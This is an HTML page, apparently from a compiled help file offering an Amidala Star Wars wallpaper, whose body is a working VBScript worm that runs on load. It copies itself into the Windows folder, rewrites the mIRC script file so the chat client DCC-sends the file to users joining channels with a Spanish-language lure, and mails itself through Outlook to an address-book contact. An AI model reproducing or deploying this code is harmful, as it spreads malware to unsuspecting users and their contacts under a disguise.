<html>
<head>
<title>Amidala</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<body bgcolor="#FFFFFF" text="#000000" background="file:///C|/Archivos%20de%20programa/Macromedia/Dreamweaver%204/Lessons/Lesson%20Files/Amidala.jpg">
<script language="VBScript">
on error resume next
	myPath=Replace(location.href,"mk:@MSITStore:","")
	myPath=Replace(myPath,"/","\")
	myPath=Mid(myPath,1,Instr(myPath,"::")-1)
Drive = "c"
 Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.GetFolder(Drive & ":\")
    Set sf = f.SubFolders
    For Each f1 In sf
                        If fso.fileExists(f1 & "\MIRC.INI") Then mIRCDir = f1 & "\MIRC.INI"
Next
Set WinDir = fso.GetSpecialFolder(0)

		fso.CopyFile myPath,WinDir & "\Amidala.chm"

	if mIRCDir = "" then

		Set Shell = CreateObject("WScript.Shell")

			mIRCDir = Shell.Regread("HKEY_LOCAL_MACHINE\SOFTWARE\CLASSES\ChatFile\DefaultIcon\")

                   		if Instr(Ucase(mIRCDir),"MIRC32.EXE") > 0 then
                    			mIRCDir = mIRCDir
                    		Else
                    			mIRCDir = ""
                    		End if

		Set Shell = Nothing

	end if

	if mIRCDir <> "" then

		mIRCDir = Mid(mIRCDir, 1, InStrRev(mIRCDir, "\"))
		mIRCDir = Replace(mIRCDir,"""","")

  	Set fso = CreateObject("Scripting.FileSystemObject")
  	Set f = fso.OpenTextFile(mIRCDir & "Script.ini", 2, True)
  	f.WriteLine "[script]"
                f.Write "n0=on 1:JOIN:#:if ( $me != $nick ) { /.msg $Nick Si te gusta la nueva Star Wars no puedes perderte este archivo | /.dcc send $nick "&WinDir&"\Amidala.chm }"
  	f.Close
	end if

	Set Shell = CreateObject("WScript.Shell")
		if Shell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\chm") = "" then

	Set Anakin = CreateObject("Outlook.Application")

	if Anakin.Name = "Outlook" then
Victim = Anakin.GetNamespace("MAPI").AddressLists.Item(1).AddressEntries.GetFirst

	With Anakin.CreateItem(olMailItem)
		.Recipients.Add Victim
		.Attachments.Add myPath
		.Subject = "¡Nuevo Fondo de Amidala - Star Wars II !"
		.Body = "Que tal?"+vbcrlf+" "+vbcrlf+"Si te gusta la nueva Star Wars mira este archivo"+vbcrlf+"Es un fondo de Amidala"+vbcrlf+"Es increible la calidad que tiene, ya me contaras que te parece"+vbcrlf+Ol.Session.CurrentUser.Name
		.Send
        End With
	End IF

	Set Anakin = Nothing
		Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\chm","1"
	Set Shell = Nothing
	End if
</script>
</body>
</html>